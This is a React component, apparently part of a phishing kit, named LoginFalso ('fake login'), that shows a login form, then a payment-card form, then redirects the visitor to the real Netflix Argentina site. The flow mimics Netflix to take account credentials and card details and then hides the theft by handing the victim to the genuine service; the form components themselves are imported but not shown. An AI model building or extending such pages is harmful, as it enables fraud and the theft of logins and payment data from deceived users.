import React, { useState } from "react";
import Login from "./componentsLoginfalso/Login/login";
import TarjetaPago from "./componentsLoginfalso/Login/Tarjeta"; // Importa tu formulario de tarjeta
import Transicion from "./componentsLoginfalso/transicion"; // Importa tu componente de transición

import styles from './Iniciar.module.css';

export default function LoginFalso() {
  const [isLoginForm, setIsLoginForm] = useState(true); // Estado para alternar formularios
  const [showTransition, setShowTransition] = useState(false); // Estado para mostrar la transición
  const [showTarjeta, setShowTarjeta] = useState(false); // Estado para mostrar la tarjeta después de la transición

  const onPaymentSuccess = () => {
    // Redirigir a la página de Netflix
    window.location.href = "https://www.netflix.com/ar/browse/genre/839338";
  };

  // Función que cambia el estado a mostrar la tarjeta después del login exitoso
  const handleLoginSuccess = () => {
    setShowTransition(true); // Comienza la transición

    // Simular un retraso para la transición
    setTimeout(() => {
      setShowTransition(false); // Finaliza la transición
      setShowTarjeta(true); // Muestra el formulario de tarjeta después de la transición
    }, 1000); // Duración de la transición, puedes ajustarlo como desees
  };

  return (
    <div className={styles.loginfalso}>
      {/* Mostrar la transición solo si showTransition es true */}
      {showTransition ? (
        <Transicion />
      ) : (
        <>
          {/* Mostrar la tarjeta después de la transición */}
          {showTarjeta ? (
            <TarjetaPago onPaymentSuccess={onPaymentSuccess} />
          ) : (
            isLoginForm && <Login onLoginSuccess={handleLoginSuccess} />
          )}
        </>
      )}
    </div>
  );
}
